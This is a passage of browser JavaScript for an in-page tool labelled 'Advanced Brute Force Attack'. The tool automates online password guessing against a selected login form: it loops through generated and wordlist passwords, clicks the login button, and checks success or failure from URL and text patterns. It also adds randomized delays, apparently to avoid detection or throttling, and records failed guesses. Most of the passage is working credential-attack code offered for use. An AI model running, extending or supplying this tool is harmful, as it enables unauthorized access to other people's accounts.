            // For a simple in-page script, this is a placeholder.
            // You might need to check if the page made an AJAX call and inspect its response.
            // Example of a conceptual check (NOT FUNCTIONAL without real network interception):
            /*
            const lastResponse = await getLastNetworkResponse(); // Hypothetical function
            if (lastResponse) {
                if (lastResponse.status === expectedStatusCode && (!successResponseText || lastResponse.text.includes(successResponseText))) {
                    loginSuccess = true;
                    logAction(`SUCCESS! Network response matched (Status: ${lastResponse.status}, Text: "${successResponseText}") for password: "${passwordToTry}"`);
                } else if (failureResponseText && lastResponse.text.includes(failureResponseText)) {
                    loginFailure = true;
                    logAction(`FAILED! Network response indicated failure (Text: "${failureResponseText}") for password: "${passwordToTry}"`);
                }
            }
            */
            logAction('Network response checking is enabled, but requires advanced browser capabilities not fully simulated here.');
        }


        if (loginSuccess) {
            statusDisplay.textContent = `SUCCESS! Password: "${passwordToTry}"`;
            isGuessingPasswords = false; // Stop on success
            // Restore password field type on success
            if (selectedPasswordElement && selectedPasswordElement.type === 'text') {
                selectedPasswordElement.type = 'password';
                logAction('Password field type reverted to "password" on success.');
            }
            return; // Stop the guessing loop
        } else if (loginFailure) {
            failedPasswords.push(passwordToTry); // Log to failed list
            failedPasswordsStatus.textContent = `${failedPasswords.length} failed passwords logged.`;
            // Continue guessing
        } else {
            // If neither success nor failure pattern matched, assume failure for logging purposes
            // This is a common scenario if the page doesn't change or show clear messages
            logAction(`Uncertain result for: "${passwordToTry}". No clear success/failure patterns matched. Assuming failure.`);
            failedPasswords.push(passwordToTry);
            failedPasswordsStatus.textContent = `${failedPasswords.length} failed passwords logged.`;
        }


        const endTime = performance.now(); // Record end time
        const duration = endTime - startTime; // Calculate duration
        passwordAttemptTimes.push(duration); // Store duration

        // Calculate delay based on safe mode or normal mode, adjusted by speed multiplier
        let delay;
        if (safeModeEnabled) {
            delay = Math.random() * (maxRangeMs - baseAutofillRate) + baseAutofillRate;
            if (delay < 0) delay = baseAutofillRate; // Ensure positive if maxRangeMs < baseAutofillRate (though settings should prevent this)
        } else {
            delay = baseAutofillRate + Math.random() * autofillRateVariance;
        }
        delay = Math.max(10, delay / speedMultiplier); // Ensure minimum delay of 10ms to prevent UI lockup

        setTimeout(attemptPassword, delay);
    }

    // --- Performance Graph Logic ---
    function drawPerformanceGraph() {
        if (!performanceCtx || performanceWindow.style.display === 'none') {
            return;
        }

        performanceCanvas.width = performanceCanvas.offsetWidth;
        performanceCanvas.height = performanceCanvas.offsetHeight;

        const ctx = performanceCtx;
        const data = passwordAttemptTimes;

        ctx.clearRect(0, 0, performanceCanvas.width, performanceCanvas.height);

        const margin = 40;
        const plotWidth = performanceCanvas.width - 2 * margin;
        const plotHeight = performanceCanvas.height - 2 * margin;

        if (data.length === 0) {
            ctx.fillStyle = 'var(--text-muted)';
            ctx.font = '14px Inter, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillText('No performance data yet. Start guessing passwords!', performanceCanvas.width / 2, performanceCanvas.height / 2);
            return;
        }

        const maxVal = Math.max(...data);
        const minVal = Math.min(...data);
        const valueRange = (maxVal - minVal) > 0 ? (maxVal - minVal) : 1;

        // Draw Axes
        ctx.strokeStyle = 'var(--text-muted)';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(margin, margin);
        ctx.lineTo(margin, performanceCanvas.height - margin);
        ctx.moveTo(margin, performanceCanvas.height - margin);
        ctx.lineTo(performanceCanvas.width - margin, performanceCanvas.height - margin);
        ctx.stroke();

        // Draw data points and lines
        ctx.strokeStyle = 'var(--primary-color)';
        ctx.fillStyle = 'var(--primary-color)';
        ctx.lineWidth = 2;

        ctx.beginPath();
        for (let i = 0; i < data.length; i++) {
            const x = margin + (i / Math.max(1, data.length - 1)) * plotWidth; // Avoid division by zero for single point
            const y = (performanceCanvas.height - margin) - ((data[i] - minVal) / valueRange) * plotHeight;

            if (i === 0) {
                ctx.moveTo(x, y);
            } else {
                ctx.lineTo(x, y);
            }
            ctx.arc(x, y, 2, 0, Math.PI * 2, false);
        }
        ctx.stroke();

        // Draw average line
        const averageTime = data.reduce((sum, val) => sum + val, 0) / data.length;
        const avgY = (performanceCanvas.height - margin) - ((averageTime - minVal) / valueRange) * plotHeight;

        ctx.strokeStyle = 'var(--secondary-color)';
        ctx.lineWidth = 1;
        ctx.setLineDash([5, 5]);
        ctx.beginPath();
        ctx.moveTo(margin, avgY);
        ctx.lineTo(performanceCanvas.width - margin, avgY);
        ctx.stroke();
        ctx.setLineDash([]);

        // Add labels
        ctx.fillStyle = 'var(--text-light)';
        ctx.font = '12px Inter, sans-serif';
        ctx.textAlign = 'right';
        ctx.textBaseline = 'middle';
        ctx.fillText(`${maxVal.toFixed(0)}ms`, margin - 5, margin);
        ctx.fillText(`${minVal.toFixed(0)}ms`, margin - 5, performanceCanvas.height - margin);
        ctx.fillText(`${averageTime.toFixed(0)}ms (Avg)`, performanceCanvas.width - margin - 5, avgY);

        ctx.textAlign = 'center';
        ctx.textBaseline = 'top';
        ctx.fillText('Attempt #1', margin, performanceCanvas.height - margin + 10);
        ctx.fillText(`Attempt #${data.length}`, performanceCanvas.width - margin, performanceCanvas.height - margin + 10);

        // Add X-axis ticks for every 100 attempts or less if data is sparse
        const tickInterval = Math.max(1, Math.floor(data.length / 5)); // At least 1, up to 5 ticks
        for (let i = 0; i < data.length; i += tickInterval) {
            const x = margin + (i / Math.max(1, data.length - 1)) * plotWidth;
            ctx.beginPath();
            ctx.moveTo(x, performanceCanvas.height - margin);
            ctx.lineTo(x, performanceCanvas.height - margin + 5);
            ctx.stroke();
            ctx.fillText(`#${i + 1}`, x, performanceCanvas.height - margin + 15);
        }
    }

    // Animation loop for the performance graph
    function animatePerformanceGraph() {
        if (performanceWindow.style.display === 'block') {
            drawPerformanceGraph();
            animationFrameId = requestAnimationFrame(animatePerformanceGraph);
        }
    }

    // --- Download Functions ---
    function downloadTextFile(filename, content) {
        const element = document.createElement('a');
        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
        element.setAttribute('download', filename);
        element.style.display = 'none';
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
        logAction(`Downloaded ${filename}.`);
    }

    // Function to save the current instance data into a JSON string
    function saveInstanceData() {
        const instanceData = {
            settings: {
                baseAutofillRate,
                autofillRateVariance,
                minPasswordLength,
                maxPasswordLength,
                includeCapitalized,
                includeNumbers,
                includeSymbols,
                autofillUsernameOnEachAttempt,
                customCharacters,
                speedMultiplier,
                safeModeEnabled,
                maxRangeMs,
                requireUsername,
                useCommonPasswordsFirst,
                successUrlPattern,
                failureTextPattern,
                successTextPattern,
                checkNetworkResponses,
                expectedStatusCode,
                successResponseText,
                failureResponseText
            },
            selectedElements: {
                username: selectedUsernameElement ? {
                    id: selectedUsernameElement.id,
                    name: selectedUsernameElement.name,
                    className: selectedUsernameElement.className,
                    tagName: selectedUsernameElement.tagName.toLowerCase()
                } : null,
                password: selectedPasswordElement ? {
                    id: selectedPasswordElement.id,
                    name: selectedPasswordElement.name,
                    className: selectedPasswordElement.className,
                    tagName: selectedPasswordElement.tagName.toLowerCase()
                } : null,
                loginButton: selectedLoginButtonElement ? {
                    id: selectedLoginButtonElement.id,
                    name: selectedLoginButtonElement.name,
                    className: selectedLoginButtonElement.className,
                    tagName: selectedLoginButtonElement.tagName.toLowerCase()
                } : null,
            },
            autofillUsernameValue: yourUsernameInput.value,
            failedPasswords: failedPasswords // Include failed passwords in the instance data
        };
        return JSON.stringify(instanceData, null, 2);
    }

    // Function to load instance data from a JSON string
    function loadInstanceData(jsonString) {
        try {
            const instanceData = JSON.parse(jsonString);

            // Load settings
            const settings = instanceData.settings;
            baseAutofillRate = settings.baseAutofillRate ?? baseAutofillRate;
            autofillRateVariance = settings.autofillRateVariance ?? autofillRateVariance;
            minPasswordLength = settings.minPasswordLength ?? minPasswordLength;
            maxPasswordLength = settings.maxPasswordLength ?? maxPasswordLength;
            includeCapitalized = settings.includeCapitalized ?? includeCapitalized;
            includeNumbers = settings.includeNumbers ?? includeNumbers;
            includeSymbols = settings.includeSymbols ?? includeSymbols;
            autofillUsernameOnEachAttempt = settings.autofillUsernameOnEachAttempt ?? autofillUsernameOnEachAttempt;
            customCharacters = settings.customCharacters ?? customCharacters;
            speedMultiplier = settings.speedMultiplier ?? speedMultiplier;
            safeModeEnabled = settings.safeModeEnabled ?? safeModeEnabled;
            maxRangeMs = settings.maxRangeMs ?? maxRangeMs;
            requireUsername = settings.requireUsername ?? requireUsername;
            useCommonPasswordsFirst = settings.useCommonPasswordsFirst ?? useCommonPasswordsFirst;
            successUrlPattern = settings.successUrlPattern ?? successUrlPattern;
            failureTextPattern = settings.failureTextPattern ?? failureTextPattern;
            successTextPattern = settings.successTextPattern ?? successTextPattern;
            checkNetworkResponses = settings.checkNetworkResponses ?? checkNetworkResponses;
            expectedStatusCode = settings.expectedStatusCode ?? expectedStatusCode;
            successResponseText = settings.successResponseText ?? successResponseText;
            failureResponseText = settings.failureResponseText ?? failureResponseText;

            // Update UI for settings
            updateSettingsUI();

            // Rebuild character set
            updateCharacterSet();

            // Load autofill username value
            yourUsernameInput.value = instanceData.autofillUsernameValue ?? '';

            // Load failed passwords
            failedPasswords = instanceData.failedPasswords ?? [];
            failedPasswordsStatus.textContent = `${failedPasswords.length} failed passwords logged.`;


            // Attempt to re-select elements
            const reselectElement = (data, fieldName, infoElement, displayElement) => {
                if (!data) {
                    infoElement.textContent = `Not selected`;
                    displayElement.style.display = 'none';
                    return null;
                }
                let element = null;
                if (data.id) {
                    element = document.getElementById(data.id);
                    if (element) {
                        logAction(`Re-selected ${fieldName} by ID: ${data.id}`);
                        infoElement.textContent = `<${data.tagName}> (ID: "${data.id}")`;
                        displayElement.style.display = 'flex';
                        return element;
                    }
                }
                if (data.name) {
                    const elementsByName = document.getElementsByName(data.name);
                    if (elementsByName.length > 0) {
                        element = Array.from(elementsByName).find(el => el.tagName.toLowerCase() === data.tagName);
                        if (element) {
                            logAction(`Re-selected ${fieldName} by Name: ${data.name}`);
                            infoElement.textContent = `<${data.tagName}> (Name: "${data.name}")`;
                            displayElement.style.display = 'flex';
                            return element;
                        }
                    }
                }
                if (data.className) {
                    const elementsByClass = document.getElementsByClassName(data.className);
                    if (elementsByClass.length > 0) {
                         element = Array.from(elementsByClass).find(el => el.tagName.toLowerCase() === data.tagName);
                        if (element) {
                            logAction(`Re-selected ${fieldName} by Class: ${data.className}`);
                            infoElement.textContent = `<${data.tagName}> (Class: "${data.className}")`;
                            displayElement.style.display = 'flex';
                            return element;
                        }
                    }
                }
                logAction(`Warning: Could not re-select ${fieldName} element based on saved data.`);
                infoElement.textContent = `Not selected (re-selection failed)`;
                displayElement.style.display = 'none';
                return null;
            };

            selectedUsernameElement = reselectElement(instanceData.selectedElements.username, 'Username', usernameElementInfo, usernameElementDisplay);
            selectedPasswordElement = reselectElement(instanceData.selectedElements.password, 'Password', passwordElementInfo, passwordElementDisplay);
            selectedLoginButtonElement = reselectElement(instanceData.selectedElements.loginButton, 'Login Button', loginButtonElementInfo, loginButtonElementDisplay);

            // Update console result input based on re-selected elements
            const updateConsoleResult = (elem, name) => {
                if (elem) {
                    const elementId = elem.id || 'No ID';
                    const elementClass = elem.className || 'No Class';
                    const tagName = elem.tagName.toLowerCase();
                    return `Selected ${name}: <${tagName}> (ID: "${elementId}", Class: "${elementClass}")`;
                }
                return `${name} not selected.`;
            };
            consoleResultInput.value = `Instance loaded. ${updateConsoleResult(selectedUsernameElement, 'Username')}, ${updateConsoleResult(selectedPasswordElement, 'Password')}, ${updateConsoleResult(selectedLoginButtonElement, 'Login Button')}.`;
            consoleResultInput.style.color = 'var(--success-text)';

            logAction('Full instance data imported successfully.');
        } catch (e) {
            logAction('Error importing instance JSON file: ' + e.message);
            console.error('Error parsing instance JSON:', e);
        }
    }


    async function downloadAllDataAsZip() {
        logAction('Preparing data for ZIP download...');
        // Dynamically import JSZip
        if (typeof JSZip === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js';
            document.head.appendChild(script);
            await new Promise(resolve => script.onload = resolve);
            logAction('JSZip library loaded.');
        }

        const zip = new JSZip();

        // Add Activity Log
        const logContent = inspectorLog.innerText;
        zip.file('activity_log.txt', logContent);

        // Add Failed Passwords Log
        const failedPasswordsContent = failedPasswords.join('\n');
        zip.file('failed_passwords.txt', failedPasswordsContent);

        // Add Full Instance Data (settings + selected elements + autofill username)
        const instanceJson = saveInstanceData(); // Use the new saveInstanceData function
        zip.file('instance.json', instanceJson);

        zip.generateAsync({ type: "blob" })
            .then(function(content) {
                const url = URL.createObjectURL(content);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'tool_backup.zip'; // Changed ZIP filename to tool_backup.zip
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                logAction('ZIP file downloaded successfully.');
            })
            .catch(e => {
                logAction('Error generating ZIP file: ' + e.message);
                console.error('ZIP generation error:', e);
            });
    }


    // --- Event Listeners for UI Interactions ---

    // Main Inspector Buttons
    consoleUsernameButton.addEventListener('click', () => activateSelectionMode('username'));
    consolePasswordButton.addEventListener('click', () => activateSelectionMode('password'));
    consoleLoginButton.addEventListener('click', () => activateSelectionMode('loginButton'));

    // Copy to clipboard buttons for selected elements
    inspectorWindow.querySelectorAll('.copy-button').forEach(button => {
        button.addEventListener('click', (event) => {
            const field = event.target.dataset.field;
            let elementInfoText = '';
            if (field === 'username' && selectedUsernameElement) {
                elementInfoText = usernameElementInfo.textContent;
            } else if (field === 'password' && selectedPasswordElement) {
                elementInfoText = passwordElementInfo.textContent;
            } else if (field === 'loginButton' && selectedLoginButtonElement) {
                elementInfoText = loginButtonElementInfo.textContent;
            }
            if (elementInfoText && elementInfoText !== 'Not selected') {
                copyToClipboard(elementInfoText);
            } else {
                logAction(`No element selected for ${field} to copy.`);
            }
        });
    });


    startButton.addEventListener('click', () => {
        if (isGuessingPasswords && !isPaused) {
            logAction('Password guessing is already running.');
            return;
        }
        if (isPaused) {
            isPaused = false;
            logAction('Password guessing resumed.');
            statusDisplay.textContent = 'Status: Running...';
            attemptPassword(); // Resume the loop
            return;
        }

        // Validate selected elements before starting
        const checkStartValidity = (elem, name, types, required) => {
            if (required && (!elem || !document.body.contains(elem) || !types.some(type => (elem.tagName === 'INPUT' && elem.type === type) || (elem.tagName === 'BUTTON' && type === 'button')))) {
                logAction(`Error: ${name} field is not selected or invalid. Please select a valid element.`);
                statusDisplay.textContent = `Status: Error (${name} not selected)`;
                return false;
            }
            if (elem && (elem.readOnly || elem.disabled)) {
                logAction(`Error: Selected ${name} field is read-only or disabled. Stopping guessing.`);
                isGuessingPasswords = false;
                statusDisplay.textContent = `Status: Error (${name} read-only/disabled)`;
                return false;
            }
            return true;
        };

        if (!checkStartValidity(selectedPasswordElement, 'Password', ['password', 'text'], true)) return;
        if (!checkStartValidity(selectedLoginButtonElement, 'Login button', ['submit', 'button'], true)) return;
        if (requireUsername && !checkStartValidity(selectedUsernameElement, 'Username', ['text', 'email'], true)) return;
        if (requireUsername && !yourUsernameInput.value.trim()) {
            logAction('Error: Username is required but the username input field is empty.');
            statusDisplay.textContent = 'Status: Error (Username empty)';
            return;
        }

        // Validate safe mode range if enabled
        if (safeModeEnabled && baseAutofillRate >= maxRangeMs) {
            logAction('Error: In Safe Mode, "Base Autofill Rate (ms)" must be less than "Max Range (ms)". Please adjust settings.');
            return;
        }

        // Initialize password generation state
        isGuessingPasswords = true;
        isPaused = false; // Ensure not paused when starting
        passwordAttemptTimes = []; // Clear performance data on new start
        initializePasswordGeneration(); // Setup the correct password generator

        // Ensure password field is visible before starting the loop
        if (selectedPasswordElement && selectedPasswordElement.type === 'password') {
            selectedPasswordElement.type = 'text';
            logAction('Password field type changed to "text" for visibility during guessing.');
        }


        statusDisplay.textContent = 'Status: Running...';
        logAction(`Starting password guessing with min length ${minPasswordLength} and max length ${maxPasswordLength}. Character set size: ${currentCharacterSet.length}. Speed: ${speedMultiplier}x. Safe Mode: ${safeModeEnabled ? 'Enabled' : 'Disabled'}. Require Username: ${requireUsername ? 'Yes' : 'No'}. Try Common Passwords First: ${useCommonPasswordsFirst ? 'Yes' : 'No'}. Excluded Passwords: ${excludedPasswords.size}.`);
        attemptPassword(); // Start the guessing loop
        if (performanceWindow.style.display === 'block') {
            animatePerformanceGraph(); // Start graph animation if window is open
        }
    });

    pauseButton.addEventListener('click', () => { // New: Pause button logic
        if (isGuessingPasswords && !isPaused) {
            isPaused = true;
            logAction('Password guessing paused.');
            statusDisplay.textContent = 'Status: Paused';
            if (animationFrameId) {
                cancelAnimationFrame(animationFrameId);
                animationFrameId = null;
                logAction('Performance graph animation stopped.');
            }
        } else if (isPaused) {
            logAction('Password guessing is already paused. Click Start to resume.');
        } else {
            logAction('Password guessing is not currently running to pause.');
        }
    });

    stopButton.addEventListener('click', () => {
        if (isGuessingPasswords || isPaused) { // Stop regardless of pause state
            isGuessingPasswords = false;
            isPaused = false; // Ensure pause is also reset
            logAction('Password guessing manually stopped.');
            statusDisplay.textContent = 'Status: Stopped';
            // Revert password field type if it was changed
            if (selectedPasswordElement && selectedPasswordElement.type === 'text') {
                selectedPasswordElement.type = 'password';
                logAction('Password field type reverted to "password".');
            }
            if (animationFrameId) {
                cancelAnimationFrame(animationFrameId);
                animationFrameId = null;
            }
        } else {
            logAction('Password guessing is not currently running.');
        }
    });

    // Settings Window Interactions
    speedSlider.addEventListener('input', () => {
        speedMultiplier = parseInt(speedSlider.value, 10);
        speedValueDisplay.textContent = `${speedMultiplier}x`;
    });

    safeModeCheckbox.addEventListener('change', () => {
        safeModeEnabled = safeModeCheckbox.checked;
        maxRangeMsInput.disabled = !safeModeEnabled;
        logAction(`Safe Mode ${safeModeEnabled ? 'enabled' : 'disabled'}.`);
    });

    requireUsernameCheckbox.addEventListener('change', () => {
        requireUsername = requireUsernameCheckbox.checked;
        consoleUsernameButton.disabled = !requireUsername;
        yourUsernameInput.disabled = !requireUsername;

        if (!requireUsername) {
            logAction('Username requirement disabled. Username field will be ignored.');
            selectedUsernameElement = null; // Clear selected username element
            yourUsernameInput.value = ''; // Clear username input value
            usernameElementInfo.textContent = 'Not selected'; // Update display
            usernameElementDisplay.style.display = 'none';
        } else {
            logAction('Username requirement enabled. Please select a username field.');
        }
    });

    useCommonPasswordsFirstCheckbox.addEventListener('change', () => {
        useCommonPasswordsFirst = useCommonPasswordsFirstCheckbox.checked;
        logAction(`Use Common Passwords First set to: ${useCommonPasswordsFirst ? 'Enabled' : 'Disabled'}.`);
    });

    includeCapitalizedCheckbox.addEventListener('change', () => {
        includeCapitalized = includeCapitalizedCheckbox.checked;
        updateCharacterSet();
        logAction(`Include Capitalized Letters: ${includeCapitalized ? 'Enabled' : 'Disabled'}.`);
    });

    includeNumbersCheckbox.addEventListener('change', () => {
        includeNumbers = includeNumbersCheckbox.checked;
        updateCharacterSet();
        logAction(`Include Numbers: ${includeNumbers ? 'Enabled' : 'Disabled'}.`);
    });

    includeSymbolsCheckbox.addEventListener('change', () => {
        includeSymbols = includeSymbolsCheckbox.checked;
        updateCharacterSet();
        logAction(`Include Symbols: ${includeSymbols ? 'Enabled' : 'Disabled'}.`);
    });

    checkNetworkResponsesCheckbox.addEventListener('change', () => { // New
        checkNetworkResponses = checkNetworkResponsesCheckbox.checked;
        expectedStatusCodeInput.disabled = !checkNetworkResponses;
        successResponseTextInput.disabled = !checkNetworkResponses;
        failureResponseTextInput.disabled = !checkNetworkResponses;
        logAction(`Network Response Checking: ${checkNetworkResponses ? 'Enabled' : 'Disabled'}.`);
    });


    commonPasswordsFileInput.addEventListener('change', (event) => {
        const file = event.target.files[0];
        if (file) {
            processFileWithWorker(file, commonPasswordsStatus, 'common passwords', 'common');
        } else {
            logAction('No common passwords file selected.');
        }
    });

    clearCommonPasswordsButton.addEventListener('click', () => {
        uploadedCommonPasswords = [];
        commonPasswordsStatus.textContent = '0 passwords loaded.';
        logAction('All common passwords cleared.');
        currentCommonPasswordIndex = 0;
        commonPasswordsExhausted = true; // Consider exhausted if cleared
        saveSettings(); // Save the empty list
    });

    excludedPasswordsFileInput.addEventListener('change', (event) => {
        const file = event.target.files[0];
        if (file) {
            processFileWithWorker(file, excludedPasswordsStatus, 'excluded passwords', 'excluded');
        } else {
            logAction('No excluded passwords file selected.');
        }
    });

    clearExcludedPasswordsButton.addEventListener('click', () => {
        excludedPasswords.clear();
        excludedPasswordsStatus.textContent = '0 passwords excluded.';
        logAction('All excluded passwords cleared.');
        saveSettings(); // Save the empty set
    });

    clearFailedPasswordsButton.addEventListener('click', () => {
        failedPasswords = [];
        failedPasswordsStatus.textContent = '0 failed passwords logged.';
        logAction('All failed passwords cleared.');
        saveSettings(); // Save the empty list
    });

    saveSettingsButton.addEventListener('click', () => {
        const newBaseRate = parseInt(baseRateInput.value, 10);
        const newVariance = parseInt(varianceInput.value, 10);
        const newMinLength = parseInt(minLengthInput.value, 10);
        const newMaxLength = parseInt(maxLengthInput.value, 10);
        const newIncludeCapitalized = includeCapitalizedCheckbox.checked;
        const newIncludeNumbers = includeNumbersCheckbox.checked;
        const newIncludeSymbols = includeSymbolsCheckbox.checked;
        const newAutofillUsername = autofillUsernameCheckbox.checked;
        const newCustomCharacters = customCharactersInput.value;
        const newSpeedMultiplier = parseInt(speedSlider.value, 10);
        const newSafeModeEnabled = safeModeCheckbox.checked;
        const newMaxRangeMs = parseInt(maxRangeMsInput.value, 10);
        const newRequireUsername = requireUsernameCheckbox.checked;
        const newUseCommonPasswordsFirst = useCommonPasswordsFirstCheckbox.checked;
        const newSuccessUrlPattern = successUrlInput.value.trim();
        const newFailureTextPattern = failureTextInput.value.trim();
        const newSuccessTextPattern = successTextInput.value.trim();
        const newCheckNetworkResponses = checkNetworkResponsesCheckbox.checked; // New
        const newExpectedStatusCode = parseInt(expectedStatusCodeInput.value, 10); // New
        const newSuccessResponseText = successResponseTextInput.value.trim(); // New
        const newFailureResponseText = failureResponseTextInput.value.trim(); // New

        let settingsChanged = false;

        // Validate and update settings
        if (!isNaN(newBaseRate) && newBaseRate >= 0) {
            if (baseAutofillRate !== newBaseRate) { baseAutofillRate = newBaseRate; settingsChanged = true; }
        } else { logAction('Invalid Base Autofill Rate.'); baseRateInput.value = baseAutofillRate; }

        if (!isNaN(newVariance) && newVariance >= 0) {
            if (autofillRateVariance !== newVariance) { autofillRateVariance = newVariance; settingsChanged = true; }
        } else { logAction('Invalid Rate Variance.'); varianceInput.value = autofillRateVariance; }

        if (!isNaN(newMinLength) && newMinLength >= 1) {
            if (minPasswordLength !== newMinLength) { minPasswordLength = newMinLength; settingsChanged = true; }
        } else { logAction('Invalid Min Password Length.'); minLengthInput.value = minPasswordLength; }

        if (!isNaN(newMaxLength) && newMaxLength >= newMinLength) {
            if (maxPasswordLength !== newMaxLength) { maxPasswordLength = newMaxLength; settingsChanged = true; }
        } else { logAction(`Invalid Max Password Length. Must be >= Min Length (${minPasswordLength}).`); maxLengthInput.value = maxPasswordLength; }

        if (includeCapitalized !== newIncludeCapitalized) { includeCapitalized = newIncludeCapitalized; settingsChanged = true; }
        if (includeNumbers !== newIncludeNumbers) { includeNumbers = newIncludeNumbers; settingsChanged = true; }
        if (includeSymbols !== newIncludeSymbols) { includeSymbols = newIncludeSymbols; settingsChanged = true; }
        if (autofillUsernameOnEachAttempt !== newAutofillUsername) { autofillUsernameOnEachAttempt = newAutofillUsername; settingsChanged = true; }
        if (customCharacters !== newCustomCharacters) { customCharacters = newCustomCharacters; settingsChanged = true; }
        if (speedMultiplier !== newSpeedMultiplier) { speedMultiplier = newSpeedMultiplier; settingsChanged = true; }
        if (safeModeEnabled !== newSafeModeEnabled) { safeModeEnabled = newSafeModeEnabled; settingsChanged = true; }

        if (!isNaN(newMaxRangeMs) && newMaxRangeMs >= 0) {
            if (maxRangeMs !== newMaxRangeMs) { maxRangeMs = newMaxRangeMs; settingsChanged = true; }
        } else { logAction('Invalid Max Range (ms).'); maxRangeMsInput.value = maxRangeMs; }

        if (requireUsername !== newRequireUsername) { requireUsername = newRequireUsername; settingsChanged = true; }
        if (useCommonPasswordsFirst !== newUseCommonPasswordsFirst) { useCommonPasswordsFirst = newUseCommonPasswordsFirst; settingsChanged = true; }
        if (successUrlPattern !== newSuccessUrlPattern) { successUrlPattern = newSuccessUrlPattern; settingsChanged = true; }
        if (failureTextPattern !== newFailureTextPattern) { failureTextPattern = newFailureTextPattern; settingsChanged = true; }
        if (successTextPattern !== newSuccessTextPattern) { successTextPattern = newSuccessTextPattern; settingsChanged = true; }
        if (checkNetworkResponses !== newCheckNetworkResponses) { checkNetworkResponses = newCheckNetworkResponses; settingsChanged = true; } // New
        if (!isNaN(newExpectedStatusCode) && newExpectedStatusCode >= 100 && newExpectedStatusCode < 600) { // New
            if (expectedStatusCode !== newExpectedStatusCode) { expectedStatusCode = newExpectedStatusCode; settingsChanged = true; }
        } else { logAction('Invalid Expected Status Code (100-599).'); expectedStatusCodeInput.value = expectedStatusCode; }
        if (successResponseText !== newSuccessResponseText) { successResponseText = newSuccessResponseText; settingsChanged = true; } // New
        if (failureResponseText !== newFailureResponseText) { failureResponseText = newFailureResponseText; settingsChanged = true; } // New

        // Rebuild currentCharacterSet based on latest settings
        updateCharacterSet();

        if (settingsChanged) {
            saveSettings();
            logAction('Settings updated and saved.');
        } else {
            logAction('No settings changes detected.');
        }
    });

    resetSettingsButton.addEventListener('click', () => {
        resetSettingsToDefault();
    });

    importInstanceButton.addEventListener('click', () => {
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = '.json';
        fileInput.onchange = (e) => {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (event) => {
                    loadInstanceData(event.target.result);
                };
                reader.onerror = (error) => {
                    logAction('Error reading instance JSON file: ' + error.message);
                    console.error('File reader error:', error);
                };
                reader.readAsText(file);
            } else {
                logAction('No instance JSON file selected for import.');
            }
        };
        fileInput.click();
    });


    // Open/Close Window Buttons
    openSettingsButton.addEventListener('click', () => {
        if (settingsWindow.style.display === 'none') {
            updateSettingsUI(); // Update UI with current values before opening
            settingsWindow.style.display = 'flex'; // Changed to flex
            centerWindow(settingsWindow);
            logAction('Settings window opened.');
        } else {
            settingsWindow.style.display = 'none';
            logAction('Settings window hidden.');
        }
    });

    clearLogButton.addEventListener('click', () => {
        inspectorLog.innerHTML = '';
        logAction('Activity log cleared.');
    });

    downloadLogButton.addEventListener('click', () => {
        const logContent = inspectorLog.innerText;
        downloadTextFile('activity_log.txt', logContent);
    });

    downloadAllDataButton.addEventListener('click', downloadAllDataAsZip);


    openLogButton.addEventListener('click', () => {
        if (logWindow.style.display === 'none') {
            logWindow.style.display = 'flex'; // Changed to flex
            centerWindow(logWindow);
            logAction('Activity Log window opened.');
        } else {
            logWindow.style.display = 'none';
            logAction('Activity Log window hidden.');
        }
    });

    openPerformanceButton.addEventListener('click', () => {
        if (performanceWindow.style.display === 'none') {
            performanceWindow.style.display = 'flex'; // Changed to flex
            centerWindow(performanceWindow);
            logAction('Performance Graph window opened.');
            if (isGuessingPasswords && !animationFrameId) {
                animatePerformanceGraph();
            } else if (!isGuessingPasswords) {
                drawPerformanceGraph();
            }
        } else {
            performanceWindow.style.display = 'none';
            logAction('Performance Graph window hidden.');
            if (animationFrameId) {
                cancelAnimationFrame(animationFrameId);
                animationFrameId = null;
            }
        }
    });

    // Toggle dot functionality (for main inspector window)
    toggleDot.addEventListener('click', () => {
        if (inspectorWindow.style.display === 'none') {
            inspectorWindow.style.display = 'flex'; // Changed to flex
            centerWindow(inspectorWindow);
            toggleDot.style.backgroundColor = 'red';
            logAction('Advanced Brute Force Attack window opened.');
        } else {
            inspectorWindow.style.display = 'none';
            toggleDot.style.backgroundColor = 'var(--primary-color)';
            logAction('Advanced Brute Force Attack window hidden.');
        }
    });

    // Main Inspector's close button now closes all windows
    const mainInspectorCloseButton = inspectorWindow.querySelector('.window-close-button');
    // Ensure existing listeners are removed before adding a new one to prevent duplicates
    const clone = mainInspectorCloseButton.cloneNode(true);
    mainInspectorCloseButton.parentNode.replaceChild(clone, mainInspectorCloseButton);
    clone.addEventListener('click', () => {
        inspectorWindow.style.display = 'none';
        settingsWindow.style.display = 'none';
        logWindow.style.display = 'none';
        performanceWindow.style.display = 'none';
        toggleDot.style.backgroundColor = 'var(--primary-color)';
        logAction('All Advanced Brute Force Attack windows closed.');
        isSelectingElement = false;
        isGuessingPasswords = false;
        isPaused = false; // Reset pause state on close
        currentFieldToPopulate = null;
        document.body.style.cursor = 'default';
        // Revert password field type only on close if it was changed
        if (selectedPasswordElement && selectedPasswordElement.type === 'text') {
            selectedPasswordElement.type = 'password';
            logAction('Password field type reverted to "password".');
        }
        statusDisplay.textContent = 'Status: Stopped';
        if (animationFrameId) {
            cancelAnimationFrame(animationFrameId);
            animationFrameId = null;
        }
    });


    // Optional: Add a simple hover effect for the buttons within the inspector
    const allButtons = [
        consoleUsernameButton, consolePasswordButton, consoleLoginButton,
        startButton, pauseButton, stopButton, saveSettingsButton, resetSettingsButton,
        openSettingsButton, openLogButton, clearLogButton,
        clearCommonPasswordsButton, clearExcludedPasswordsButton, clearFailedPasswordsButton,
        openPerformanceButton, downloadLogButton, downloadAllDataButton, importInstanceButton
    ];
    allButtons.forEach(button => {
        if (button) { // Ensure button exists before adding listener
            button.addEventListener('mouseenter', () => {
                button.style.filter = 'brightness(1.1)';
            });
            button.addEventListener('mouseleave', () => {
                button.style.filter = 'brightness(1)';
            });
        }
    });

    // Initial update of UI elements for selected elements
    if (selectedUsernameElement) {
